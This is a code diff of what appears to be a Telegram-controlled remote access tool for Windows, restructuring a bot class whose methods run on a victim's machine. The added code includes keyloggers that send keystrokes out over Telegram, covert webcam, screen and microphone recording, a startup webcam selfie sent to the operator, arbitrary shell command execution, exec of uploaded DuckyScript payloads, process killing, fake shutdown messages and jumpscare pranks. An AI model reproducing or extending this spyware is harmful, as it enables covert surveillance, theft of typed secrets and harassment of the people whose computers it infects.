-        saved_filepath = join(BURN_DIRECTORY, saved_filename)
-        self.bot.download_file(file_id, saved_filepath)
-        if mimetype == "document":
-            filename = document["file_name"]
-            if filename.endswith(".dd"):
-                with open(saved_filepath, "r") as fi:
-                    content = fi.read()
-                payload_python = toducky(content)
-                self.bsend(f"Executing duckyscript {filename}({saved_filename})")
-                exec(payload_python)
-                remove(saved_filepath)
+        def altf4(self) -> None:
+            press_key('alt')
+            press_key('f4')
+            release_key('f4')
+            release_key('alt')
 
-        elif mimetype == "video":
-            caption = msg["caption"].lower().strip()
-            if caption == "/setvideowallpaper":
-                duration = document["duration"]
-                video_stream = VideoCapture(saved_filepath)
-                res = True
-                start=time()
-                while res and (time()-start)<=duration:
-                    res, frame = video_stream.read()
-                    imwrite("tmp.png", frame)
-                    change_wallpaper(abspath("tmp.png"))
-                remove("tmp.png")
-                self.restore_wallpaper()
-        
-    def handle(self, msg: str) -> None:
-        content_type, chat_type, chat_id = glance(msg)
-        sender_name = msg["from"]["first_name"] 
-        if chat_id == self.owner_id:
-            self.owner_name = sender_name
-            if content_type == "text":
-               self.parse_text(msg) 
-            elif content_type == "photo":
-                self.parse_photo(msg)
-            elif content_type == "document":
-                self.parse_document(msg)
-            elif content_type == "video":
-                self.parse_document(msg, mimetype="video")
-            elif content_type in ("voice", "audio"):
-                self.parse_audio(msg)
-            else:
-                self.bsend(f"Unparsed content-type: {content_type}")
-        else:
-            self.bsend(f"What do you want {sender_name}, I don't work for you.")
+        def breath(self) -> None:
+            self.__play_loaded_sound("breath")
 
-    def cantopen(self, process: str) -> None:
-        self.cantopenlist.append(process)
-        self.bsend(f"Added {process} to cantopenlist.")
-
-    def removefromcantopen(self, process: str) -> None:
-        self.cantopenlist.remove(process)
-        self.bsend(f"Removed {process} to cantopenlist.")
-
-    def cantopenmenu(self) -> None:
-        if self.cantopenlist:
-            dict_menu = { proc:f"/cantopenremove {proc}" for proc in self.cantopenlist}
-            menu = self.new_menu(dict_menu)
-        else:
-            self.bsend("cantopenlist is empty.")
-    
-    def cantopenkiller(self) -> None:
-        while True:
-            for process in self.cantopenlist:
-                if self.check_if_proc_running(process):
-                    self.terminate_process_by_name(process)
-            sleep(1)
-    
-    def extract_commands(self) -> list[dict]:
-        commands = findall(r'^([a-zA-Z0-9_]+) - (.*)', self.help, M)
-        return [{'command': cmd, 'description': desc} for cmd, desc in commands]
-
-    def update_commands(self) -> bool:
-        commands = self.extract_commands()
-        url = f'https://api.telegram.org/bot{self.token}/setMyCommands'
-        payload = {'commands': commands}
-        response = requests.post(url, json=payload)
-        return response.status_code == 200
-
-    def restore_wallpaper(self) -> None:
-        change_wallpaper(self.backup_wallpaper_path)
-
-    def start(self) -> None:
-        try:
-            self.bot.deleteWebhook()
-        except MaxRetryError:
-            sys.exit() 
-        self.update_commands()
-        self.images = load_images()
-        nomemes = list(self.images.copy().keys())
-        self.nomemes = filter(lambda x: not("meme" in x), nomemes)
-        self.audios = load_audios()
-        self.backup_wallpaper_path = join(BURN_DIRECTORY, get_current_wallpaper())
-        self.cantopenthread = Thread(target=self.cantopenkiller)
-        self.cantopenthread.start()
-        self.screen_width, self.screen_height = pg.size()
-        if not sys.argv[1:]:
-            if not self.selfie(f"Bot started: "+now()):
-                self.bsend(f"Bot started: {now()}")
-        else:
-            self.bsend(f"Bot started: {now()}")
-        loop = MessageLoop(self.bot, {"chat":self.handle, "callback_query":self.on_callback_query})
-        loop.run_as_thread()
-        while 1:
+        def bsend(self, text: str, retries=0) -> int|None:
+            if retries>3:
+                return
             try:
-                sleep(0.01)
-            except KeyboardInterrupt:
-                self.bsend("Interrupted by host, bye bye")
-                self.clear()
-                break
+                if checkconn():
+                    return self.bot.sendMessage(self.owner_id, text)["message_id"]
+                raise ConnectionError
+            except Exception as e:
+                return self.bsend(text, retries+1)
+
+        def cantopen(self, process: str) -> None:
+            self.cantopenlist.append(process)
+            self.bsend(f"Added {process} to cantopenlist.")
+
+        def cantopenkiller(self) -> None:
+            while True:
+                for process in self.cantopenlist:
+                    if self.check_if_proc_running(process):
+                        self.terminate_process_by_name(process)
+                sleep(1)
+
+        def cantopenmenu(self) -> None:
+            if self.cantopenlist:
+                dict_menu = { proc:f"/cantopenremove {proc}" for proc in self.cantopenlist}
+                menu = self.new_menu(dict_menu)
+            else:
+                self.bsend("cantopenlist is empty.")
+
+        def check_if_proc_running(self, processname) -> bool:
+            return processname.lower().strip() in [x.name().lower().strip() for  x in psutil.process_iter()]
+
+        def checkforface(self) -> None:
+            res, frame = detect_face(self.cap)
+            if res:
+                self.bsend("Face found")
+            else:
+                self.bsend("Face not found")
+
+        def clear(self) -> None:
+            self.closecap()
+            map(remove, listdir(BURN_DIRECTORY))
+            destroyAllWindows()
+            self.audio_mixer.mute()
+            #self.restore_wallpaper()
+            self.cantopenlist.clear()
+
+        def closecap(self) -> None:
+            if self.cap.isOpened():
+                self.cap.release()
+
+        def distorted_screen(self) -> None:
+            self.modded_screenshot(lambda x: distorted_screen(x, randint(20, 40), randint(50, 55)))
+
+        def execute(self, command) -> None:
+            s = sp.run(command.split, stdout=sp.PIPE, stderr=sp.PIPE, encoding="utf-8")
+            if s.returncode:
+                output = s.stderr
+            else:
+                output = s.stdout
+    
+            self.bsend(output)
+
+        def extract_commands(self) -> list[dict]:
+            commands = findall(r'^([a-zA-Z0-9_]+) - (.*)', self.help, M)
+            return [{'command': cmd, 'description': desc} for cmd, desc in commands]
+
+        def fake_shutdown(self) -> None:
+            system('shutdown /s /t 34 /c "Windows Error 104e240-69, please notify the administrator"')
+            system("shutdown -a")
+
+        def gabinetti(self) -> None:
+            self.jumpscare("plankton_meme", "gabinetti")
+
+        def handle(self, msg: str) -> None:
+            content_type, chat_type, chat_id = glance(msg)
+            sender_name = msg["from"]["first_name"] 
+            if chat_id == self.owner_id:
+                self.owner_name = sender_name
+                if content_type == "text":
+                   self.parse_text(msg) 
+                elif content_type == "photo":
+                    self.parse_photo(msg)
+                elif content_type == "document":
+                    self.parse_document(msg)
+                elif content_type == "video":
+                    self.parse_document(msg, mimetype="video")
+                elif content_type in ("voice", "audio"):
+                    self.parse_audio(msg)
+                else:
+                    self.bsend(f"Unparsed content-type: {content_type}")
+            else:
+                self.bsend(f"What do you want {sender_name}, I don't work for you.")
+
+        def inverted_screen(self) -> None:
+            self.modded_screenshot(invert_image)
+
+        def johnpork(self, audio=True) -> None:
+            self.jumpscare("johnpork_meme", "johnpork", playaudio=audio, setvolume=50)
+
+        def johnporknoaudio(self) -> None:
+            self.johnpork(False)
+
+        def jumpscare(self, image=None, audio=None, playaudio=True, showimage=True, setvolume: int=100) -> None:
+            old_volume = self.audio_mixer.getVolumePercentage()
+            self.audio_mixer.setVolumePercentage(setvolume)
+            if image is None:
+                image = self.images[choice(list(self.nomemes))]
+            else:
+                if image in self.images:
+                    image = self.images[image]
+                else:
+                    image = imread(image)
+            if audio is None:
+                audio = self.audios["ghost-roar"]
+            else:
+                audio = self.audios[audio]
+            imageThread = Thread(target=show_image_fullscreen ,args=(image,))
+    
+            if showimage:
+                imageThread.start()
+            if playaudio:
+                self.__playsound(audio)
+            if showimage:
+                imageThread.join()
+            self.audio_mixer.setVolumePercentage(old_volume)
+
+        def jumpscarenoaudio(self) -> None:
+            self.jumpscare(playaudio=False)
+
+        def keylogger(self, timeout: int=10) -> None:
+            buffer = StringIO()
+            start=time()
+            loading_bar = self.new_loading_bar(timeout, "Keylogger with file", showperc=True)
+            while (time()-start)<timeout:
+                loading_bar.update(time()-start)
+                event = read_event()
+                if event.event_type == KEY_DOWN:
+                    e = event.name.split()[0]
+                    if e in printable:
+                        buffer.write(e)
+                    else:
+                        buffer.write(f"\n{e.upper()}\n")
+            buffer.seek(0)
+            with buffer:
+                self.bot.sendDocument(self.owner_id, (f"keylog{now()}.txt",buffer))
+            loading_bar.set100()
+            loading_bar.delete()
+
+        def leftclick(self) -> None:
+            pg.leftClick()
+
+        def live_keylogger(self, timeout=10) -> None:
+            start = time()
+            buffer = ""
+            self.bsend("Live keylogger started")
+            while time()-start < timeout:
+                event = read_event()
+                if event.event_type == KEY_DOWN:
+                    e = event.name.split()[0]
+                    if e in printable and not(e in " \n\t"):
+                        buffer+=e
+                    else:
+                        self.bsend(f"BUFFER: {buffer}")
+                        buffer=""
+            self.bsend("Live keylogger done")
+
+        def message_box(self, text: str, title: str = "Warning", style: int = 0x1000) -> int:
+            def run():
+                ctypes.windll.user32.MessageBoxW(0, text, title, style)
+            Thread(target=run, daemon=True).start()
+
+        def mixer_menu(self) -> None:
+            buttons = {
+                "🔊Full Volume":"/fullvolume",
+                "🔉Half Volume":"/setvolume 50",
+                "🔇Mute":"/mutevolume",
+            }
+            self.mixer_menu_keyboard = self.new_menu(buttons, close_btn_lab="MXR_close")
+
+        def modded_screenshot(self, effect: Callable, timeout: int=1250) -> None:
+            filename = join(BURN_DIRECTORY, randompngname())
+            pg.screenshot(filename)
+            img = imread(filename)
+            modded_img = effect(img)
+            show_image_fullscreen(modded_img, timeout)
+
+        def mousecontroller(self) -> None:
+            menu = {
+                "LEFT CLICK":"/leftclick", "UP":"/mouseu","RIGHTCLICK":"/rightclick",
+                "LEFT":"/mousel","DOWN":"/moused","RIGHT":"/mouser"
+            }
+            self.mouse_controller_menu = self.new_menu(menu, label="Mouse Control", rows=3)
+
+        def moused(self) -> None:
+            pos = pg.position()
+            pg.moveTo(pos[0], pos[1]+MOUSE_JMP)
+
+        def mousel(self) -> None:
+            pos = pg.position()
+            pg.moveTo(pos[0]-MOUSE_JMP, pos[1])
+
+        def mouser(self) -> None:
+            pos = pg.position()
+            pg.moveTo(pos[0]+MOUSE_JMP, pos[1])
+
+        def mouseu(self) -> None:
+            pos = pg.position()
+            pg.moveTo(pos[0], pos[1]-MOUSE_JMP)
+
+        def new_editable_message(self, content: str, autosend: bool=True) -> EditableMessage:
+            return EditableMessage(self.bot, self.owner_id, content, autosend)
+
+        def new_loading_bar(self, total: int, autodelete: bool=False, showperc:bool=False, label=None) -> LoadingBar:
+            return LoadingBar(total, self.owner_id, self.bot, autodelete=autodelete, showperc=showperc, label=label, full_char=self.loading_bar_set[0], empty_char=self.loading_bar_set[1], spinner_frames=self.loading_bar_spinner, spinner_pos="right", bar_lenght=10) 
+
+        def new_menu(self, menu: dict[str:Any], autosend: bool=True, label: str="Choose an option: ", page: int=0, next_btn: bool=False, next_btn_lab: str="next_page", prev_btn_lab: str="previus_page", close_btn_lab: str="close_page", rows=2) -> ButtonsMenu:
+            return ButtonsMenu(self.owner_id, self.bot, menu, label, autosend, page=page, next_btn=next_btn, next_btn_lab=next_btn_lab, prev_btn_lab=prev_btn_lab, close_btn_lab=close_btn_lab, keyboard_rows=rows)
+
+        def on_callback_query(self, msg) -> None:
+            query_id, from_id, data = glance(msg, flavor="callback_query")
+            self.parse_command(data) 
+            self.bot.answerCallbackQuery(query_id)
+
+        def opencap(self) -> None:
+            if not self.cap.isOpened():
+                self.cap.open(0)
+
+        def parse_audio(self, msg: dict) -> None:
+            if 'voice' in msg:
+                file_id = msg['voice']['file_id']
+            elif 'audio' in msg:
+                file_id = msg['audio']['file_id']
+            file_info = self.bot.getFile(file_id)
+            file_url = f"https://api.telegram.org/file/bot{self.token}/{file_info['file_path']}"
+            filename = randomname()+".ogg"
+            filepath = join(BURN_DIRECTORY, filename)
+            response = requests.get(file_url)
+            with open(filepath, "wb") as f:
+                f.write(response.content) 
+            filepath = ogg_to_wav(filepath, rmold=True)
+            self.__playsound(filepath)
+            remove(filepath)
+
+        def parse_command(self, text: str) -> None:
+            args = text.split()
+            command = args[0]
+    
+            if command.startswith("/"):
+                command = args[0][1:]
+            function_args = args[1:]
+            function_args = list(map(lambda x: int(x) if x.isdigit() else x, function_args))
+    
+            func = self.function_table.get(command)
+            if func:
+                try:
+                    if func in self.no_background_functions:
+                        func(*function_args)
+                    else:
+                        if function_args:
+                            thread_args = (*function_args,)
+                            new_thread = Thread(target=func, args=thread_args)
+                        else:
+                            new_thread = Thread(target=func)
+                        new_thread.start()
+                except TypeError as e:
+                    self.bsend(f"Invalid args for function {command}\n{e}")
+                except Exception as e:
+                    self.bsend(f"Unhandled error for function {command}\n{e}")
+            elif func is None and command.startswith("PK"):
+                if command == "PK_next_page" and self.process_explorer_menu:
+                    self.process_killer_page += 1
+                    self.process_killer(page=self.process_killer_page)
+                elif command == "PK_previous_page" and self.process_explorer_menu:
+                    self.process_killer_page -= 1
+                    self.process_killer(page=self.process_killer_page)
+                elif command == "PK_close_page" and self.process_explorer_menu:
+                    self.process_explorer_menu.delete()
+                elif command in ("PK_next_page", "PK_previous_page") and not self.process_explorer_menu:
+                    self.bsend("Use /processkiller first")
+            elif command.startswith("MXR"):
+                if command == "MXR_close":
+                    if self.mixer_menu_keyboard:
+                        self.mixer_menu_keyboard.delete()
+                        self.mixer_menu_keyboard = None
+            else:
+                self.bsend(f"Invalid command {command}")
+
+        def parse_document(self, msg: str, mimetype="document") -> None:
+            document = msg[mimetype]
+            file_id = document["file_id"]
+            saved_filename = randomname()
+            saved_filepath = join(BURN_DIRECTORY, saved_filename)
+            self.bot.download_file(file_id, saved_filepath)
+            if mimetype == "document":
+                filename = document["file_name"]
+                if filename.endswith(".dd"):
+                    with open(saved_filepath, "r") as fi:
+                        content = fi.read()
+                    payload_python = toducky(content)
+                    self.bsend(f"Executing duckyscript {filename}({saved_filename})")
+                    exec(payload_python)
+                    remove(saved_filepath)
+    
+            elif mimetype == "video":
+                caption = msg["caption"].lower().strip()
+                if caption == "/setvideowallpaper":
+                    duration = document["duration"]
+                    video_stream = VideoCapture(saved_filepath)
+                    res = True
+                    start=time()
+                    while res and (time()-start)<=duration:
+                        res, frame = video_stream.read()
+                        imwrite("tmp.png", frame)
+                        change_wallpaper(abspath("tmp.png"))
+                    remove("tmp.png")
+                    self.restore_wallpaper()
+
+        def parse_photo(self, msg: dict) -> None:
+            filename = randompngname()
+            filepath = join(BURN_DIRECTORY, filename)
+            self.bot.download_file(msg['photo'][-1]['file_id'], filepath)
+            if "caption" in msg.keys():
+                if msg["caption"] == "/jumpscare":
+                    self.jumpscare(filepath)
+                    return
+            Thread(target=self.show_image, args=[filepath,]).start()
+            sleep(0.5)
+            remove(filepath)
+
+        def parse_text(self, msg: dict) -> None:
+            text = msg["text"]
+            if text == "/start":
+                return None
+            elif ";" in text:
+                commands = text.split(";")
+                for command in commands:
+                    self.parse_command(command) 
+            else:
+                self.parse_command(text)
+
+        def plankton(self, audio=True) -> None:
+            self.jumpscare("plankton_meme", "plankton", playaudio=audio, setvolume=50)
+
+        def planktonnoaudio(self) -> None:
+            self.plankton(audio=False)
+
+        def process_killer(self, page=0) -> None:
+            if self.process_explorer_menu is None:
+                self.process_killer_page = 0
+            else:
+                self.process_explorer_menu.delete()
+                self.process_killer_page = page
+            processes = [x.name() for x in psutil.process_iter()] 
+            self.process_explorer_menu = self.new_menu({process:f"/terminateprocess {process}" for process in processes}, next_btn=True, autosend=False, page=self.process_killer_page, next_btn_lab="PK_next_page", prev_btn_lab="PK_previous_page", close_btn_lab="PK_close_page", rows=3)
+            return self.process_explorer_menu.send_keyboard()
+
+        def pss(self) -> None:
+            self.__play_loaded_sound("pss")
+
+        def quickmenu(self) -> int:
+            buttons = {
+                "selfie":"selfie",
+                "Screenshot":"screenshot",
+                "Jumpscare":"jumpscare",
+                "Plankton":"plankton",
+                "ALT F4":"altf4",
+                "Psst..":"pss",
+                "Webcam Clip (5s)":"webcamclip",
+                "Screen Clip (5s)":"screenclip",
+                "Full Clip (5s)":"fullclip",
+                "Microphone Clip (5s)":"microphone",
+            }
+            menu = self.new_menu(buttons, autosend=False)
+            return menu.send_keyboard()
+
+        def randomkeyboard(self, timeout: int =5) -> None:
+            start = time()
+            loading_bar = self.new_loading_bar(timeout, label="Random Keyboard", showperc=True)
+            while (time()-start)<timeout:
+                loading_bar.update(time()-start)
+                event = read_event()
+                if event.event_type == KEY_DOWN:
+                    e = event.name.split()[0]
+                    if e in printable:
+                        pg.press("backspace")
+                        pg.write(choice(printable))
+            loading_bar.set100()
+            loading_bar.delete()
+
+        def record_audio(self, filename, seconds, samplerate=48000) -> bool|Exception:
+            try:
+                seconds = float(seconds)
+                frames = int(seconds * samplerate)
+                data = sd.rec(frames, samplerate=samplerate, channels=1, dtype='int16')
+                sd.wait()
+                sf.write(filename, data, samplerate)
+                return True
+            except Exception as e:
+                return e 
+
+        def record_jumpscare_reaction(self, onlycamera=False) -> None:
+            if onlycamera:
+                recording_thread = Thread(target=self.record_webcam, args=(20,))
+            else:
+                recording_thread = Thread(target=self.record_webcam_and_screen, args=(20,))
+    
+            recording_thread.start()
+            status_message = self.new_editable_message("Recording")
+            sleep(10)
+            self.jumpscare(playaudio=True)
+            status_message.edit("Jumpscared!")
+            recording_thread.join()
+            status_message.delete()
+
+        def record_screen(self, duration: int=5, caption: str|None=None) -> None:
+            duration = int(duration)
+            bar = self.new_loading_bar(duration, label="Recording Screen")
+            try:
+                filename = f"{BURN_DIRECTORY}/{randomname()}.mp4"
+                audio_filename = f"{BURN_DIRECTORY}/{randomname()}.wav"
+                SCREEN_SIZE = tuple(pg.size())
+                fourcc = VideoWriter_fourcc(*'XVID')
+                out = VideoWriter(filename, fourcc, 20.0, SCREEN_SIZE)
+                start_time = time()
+                samplerate = 44100
+                channels = 1
+                frames = int(duration * samplerate)
+                audio_data = sd.rec(frames, samplerate=samplerate, channels=channels, dtype='int16')
+    
+                time_elapsed = 0
+                while int(time_elapsed) < duration:
+                    time_elapsed = time() - start_time
+                    bar.progress = time_elapsed
+                    bar.update()
+                    img = pg.screenshot()
+                    img = np.array(img)
+                    img = cvtColor(img, COLOR_BGR2RGB)
+                    out.write(img)
+                bar.set100()
+    
+                sd.wait()
+                out.release()
+                sf.write(audio_filename, audio_data, samplerate)
+                video_clip = VideoFileClip(filename)
+                audio_clip = AudioFileClip(audio_filename)
+                video_with_audio = video_clip.set_audio(audio_clip)
+                final_filename = filename.replace(".mp4", "_final.mp4")
+                video_with_audio.write_videofile(final_filename, logger=None)
+                tmploadingmessage = self.new_editable_message("Sending recording...", True)
+                with open(final_filename, "rb") as video:
+                    self.bot.sendVideo(self.owner_id, video, caption=caption)
+                tmploadingmessage.delete()
+                remove(filename)
+                remove(audio_filename)
+                remove(final_filename)
+            except Exception as e:
+                self.bsend(f"Error while recording screen: {e}")
+            bar.fill_and_delete()
+
+        def record_webcam(self, duration: int=5, caption: str|None=None) -> None:
+            duration = int(duration)
+            bar = self.new_loading_bar(duration, label="Recording Webcam")
+            try:
+                filename = f"{BURN_DIRECTORY}/{randomname()}.mp4"
+                audio_filename = f"{BURN_DIRECTORY}/{randomname()}.wav"
+                fourcc = VideoWriter_fourcc(*'XVID')
+                self.opencap()
+                webcam = self.cap
+                width = int(webcam.get(CAP_PROP_FRAME_WIDTH))
+                height = int(webcam.get(CAP_PROP_FRAME_HEIGHT))
+                out = VideoWriter(filename, fourcc, 20.0, (width, height))
+                start_time = time()
+                samplerate = 44100
+                channels = 1
+                frames = int(duration * samplerate)
+                audio_data = sd.rec(frames, samplerate=samplerate, channels=channels, dtype='int16')
+                time_elapsed = 0
+                while int(time_elapsed) < duration:
+                    time_elapsed = time() - start_time
+                    bar.progress = time_elapsed
+                    bar.update()
+                    ret, frame = webcam.read()
+                    if not ret:
+                        break
+                    out.write(frame)
+                bar.set100()
+                sd.wait()
+                out.release()
+                self.closecap()
+                sf.write(audio_filename, audio_data, samplerate)
+                video_clip = VideoFileClip(filename)
+                audio_clip = AudioFileClip(audio_filename)
+                video_with_audio = video_clip.set_audio(audio_clip)
+                final_filename = filename.replace(".mp4", "_final.mp4")
+                video_with_audio.write_videofile(final_filename, logger=None)
+                tmploadingmessage = self.new_editable_message("Sending recording...", True)
+                with open(final_filename, "rb") as video:
+                    self.bot.sendVideo(self.owner_id, video, caption=caption)
+                tmploadingmessage.delete()
+                remove(filename)
+                remove(audio_filename)
+                remove(final_filename)
+            except Exception as e:
+                self.bsend(f"Error while recording webcam {e}")
+            bar.fill_and_delete()
+
+        def record_webcam_and_screen(self, capture_duration: int=5, caption: str|None=None) -> None:
+            capture_duration = int(capture_duration)
+            bar = self.new_loading_bar(capture_duration, label="Recording Webcam&Screen")
+            try:
+                filename = join(BURN_DIRECTORY, randomname() + ".mp4")
+                audio_filename = join(BURN_DIRECTORY, randomname() + ".wav")
+                SCREEN_SIZE = tuple(pg.size())
+                fourcc = VideoWriter_fourcc(*'XVID')
+                out = VideoWriter(filename, fourcc, 20.0, SCREEN_SIZE)
+                self.opencap()
+                webcam = self.cap
+                start_time = time()
+                samplerate = 44100
+                channels = 1
+                frames = int(capture_duration * samplerate)
+                audio_data = sd.rec(frames, samplerate=samplerate, channels=channels, dtype='int16')
+    
+                time_elapsed = 0 
+                while int(time_elapsed) < capture_duration:
+                    time_elapsed = time() - start_time
+                    bar.progress = time_elapsed
+                    bar.update()
+                    img = pg.screenshot()
+                    img = np.array(img)
+                    img = cvtColor(img, COLOR_BGR2RGB)
+                    _, frame = webcam.read()
+                    fr_height, fr_width, _ = frame.shape
+                    frame = resize(frame, (fr_width//2, fr_height//2))
+                    fr_height, fr_width, _ = frame.shape
+                    img[0:fr_height, 0:fr_width, :] = frame[0:fr_height, 0:fr_width, :]
+                    out.write(img)
+                bar.set100()
+                sd.wait()
+                out.release()
+                self.closecap()
+                sf.write(audio_filename, audio_data, samplerate)
+                video_clip = VideoFileClip(filename)
+                audio_clip = AudioFileClip(audio_filename)
+                video_with_audio = video_clip.set_audio(audio_clip)
+                final_filename = filename.replace(".mp4", "_final.mp4")
+                video_with_audio.write_videofile(final_filename, logger=None)#someone must pay for this
+                tmploadingmessage = self.new_editable_message("Sending recording...", True)
+                with open(final_filename, "rb") as video:
+                    self.bot.sendVideo(self.owner_id, video, caption=caption)
+                tmploadingmessage.delete()
+                remove(filename)
+                remove(audio_filename)
+                remove(final_filename)
+            except Exception as e:
+                e = traceback.format_exc()
+                self.bsend(f"Error while sending video clip\n{e}")
+            bar.fill_and_delete()
+
+        def removefromcantopen(self, process: str) -> None:
+            self.cantopenlist.remove(process)
+            self.bsend(f"Removed {process} to cantopenlist.")
+
+        def restore_wallpaper(self) -> None:
+            change_wallpaper(self.backup_wallpaper_path)
+
+        def rightclick(self) -> None:
+            pg.rightClick()
+
+        def screenshot(self) -> int:
+            try:
+                filename = join(BURN_DIRECTORY,randompngname())
+                screenshot = pg.screenshot()
+                screenshot.save(filename)
+                message_id = self.__send_image(filename)
+                remove(filename)
+                return message_id
+            except Exception as e:
+                return self.bsend(f"Error while getting screenshot\n{e}")
+
+        def selfie(self, caption: str|None=None) -> None:
+            try:
+                filename = join(BURN_DIRECTORY,randompngname())
+                self.opencap()
+                camera = self.cap
+                return_value, image = camera.read()
+                if not return_value:
+                    raise Exception("Could not find camera")
+                imwrite(filename, image)
+                self.bot.sendPhoto(self.owner_id, open(filename, "rb"), caption=caption)
+                remove(filename)
+                self.closecap()
+                return True
+            except Exception as e:
+                self.bsend(f"Something has happened while getting webcam\n {e}")
+                return False
+
+        def send_record_audio(self, seconds: int=5, caption: str|None=None) -> None:
+            message = self.new_editable_message(f"Recording audio of {seconds} seconds.")
+            filename = randomname()+".wav"
+            filepath = join(BURN_DIRECTORY, filename)
+            res = self.record_audio(filepath, seconds)
+            if isinstance(res, Exception):
+                err = f"Error while recording audio: {res}"
+                self.bsend(err)
+            else:
+                message.edit("Done recording, sending...")
+                filepath = wav_to_ogg(filepath, rmold=True)
+                with open(filepath, "rb") as fi:
+                    self.bot.sendVoice(self.owner_id, fi, caption=caption)
+                remove(filepath)
+                message.delete()
+
+        def setCameraAsWallpaper(self, seconds: float|int=5):
+            seconds = int(seconds)
+            loading_bar = self.new_loading_bar(label="Set Camera As Wallpaper", total=seconds, showperc=True)
+            filename = join(BURN_DIRECTORY, "jxframe.png")
+            start = time()
+            res = True
+            self.opencap()
+            while time()-start <= seconds and res:
+                loading_bar.update(time()-start)
+                res, frame = self.cap.read()
+                frame = pad_to_16_9(frame)
+                imwrite(filename, frame)
+                change_wallpaper(filename)
+            loading_bar.set100()
+            self.closecap()
+            sleep(1)
+            try:
+                remove(filename)
+            except FileNotFoundError:
+                ...
+            loading_bar.delete()
+            self.restore_wallpaper()
+
+        def set_volume(self, volume):
+            if volume in range(0, 101):
+                self.audio_mixer.setVolumePercentage(volume)
+            else:
+                self.bsend(f"Volume must be from 0.0 to 100.0")
+
+        def setvideowallpaper(self, videofilename: str):
+            res = True
+            filename = join(BURN_DIRECTORY, "jxframe.png")
+            backup_filename = join(BURN_DIRECTORY, "backup.png")
+            self.opencap()
+            video = VideoCapture(abspath(videofilename))
+            while res:
+                res, frame = video.read()
+                imwrite(frame)
+                change_wallpaper(filename)
+            change_wallpaper(backup_filename)
+            remove(filename)
+            remove(backup_filename)
+            self.closecap()
+            self.restore_wallpaper()
+
+        def show_image(self, image_path: str) -> None:
+            try:
+                imshow("Warning", resize(imread(image_path), (400, 400)))
+                setWindowProperty("Warning", WND_PROP_TOPMOST, 1)
+                waitKey(0)
+                destroyWindow("Warning")
+                remove(image_path)
+            except Exception as e:
+                self.bsend(f"Error while trying to show image: \n{e}")
+
+        def shutdown(self, seconds=0) -> None:
+            system(f"shutdown -s -t {seconds}")
+
+        def spam_windows(self, n: int, text: str) -> None:
+            for i in range(n):
+                sp_win = Thread(target=self.message_box, args=["Warning", text,])
+                sp_win.start()
+
+        def start(self) -> None:
+            try:
+                self.bot.deleteWebhook()
+            except MaxRetryError:
+                sys.exit() 
+            self.update_commands()
+            self.images = load_images()
+            nomemes = list(self.images.copy().keys())
+            self.nomemes = filter(lambda x: not("meme" in x), nomemes)
+            self.audios = load_audios()
+            self.backup_wallpaper_path = join(BURN_DIRECTORY, get_current_wallpaper())
+            self.cantopenthread = Thread(target=self.cantopenkiller)
+            self.cantopenthread.start()
+            self.screen_width, self.screen_height = pg.size()
+            if not sys.argv[1:]:
+                if not self.selfie(f"Bot started: "+now()):
+                    self.bsend(f"Bot started: {now()}")
+            else:
+                self.bsend(f"Bot started: {now()}")
+            loop = MessageLoop(self.bot, {"chat":self.handle, "callback_query":self.on_callback_query})
+            loop.run_as_thread()
+            while 1:
+                try:
+                    sleep(0.01)
+                except KeyboardInterrupt:
+                    self.bsend("Interrupted by host, bye bye")
+                    self.clear()
+                    break
+
+        def terminate_process_by_name(self, process_name: str) -> None:
+            for proc in psutil.process_iter():
+                if proc.name().lower() == process_name.lower().strip():
+                    proc.terminate()
+
+        def update_commands(self) -> bool:
+            commands = self.extract_commands()
+            url = f'https://api.telegram.org/bot{self.token}/setMyCommands'
+            payload = {'commands': commands}
+            response = requests.post(url, json=payload)
+            return response.status_code == 200
+
+        def waitforface(self, timeout=60):
+            start = time()
+            self.opencap()
+            cap = self.cap
+            while time()-start < timeout:
+                res, frame = detect_face(cap)
+                if frame is None:
+                    self.bsend("Face recognition model not loaded properly.")
+                    break
+                if res:
+                    filename = randompngname()
+                    imwrite(filename, frame)
+                    self.__send_image(filename)
+                    remove(filename)
+                    break
+            self.closecap()
 
 if __name__ == "__main__":
     token, chat_id = getCred() 
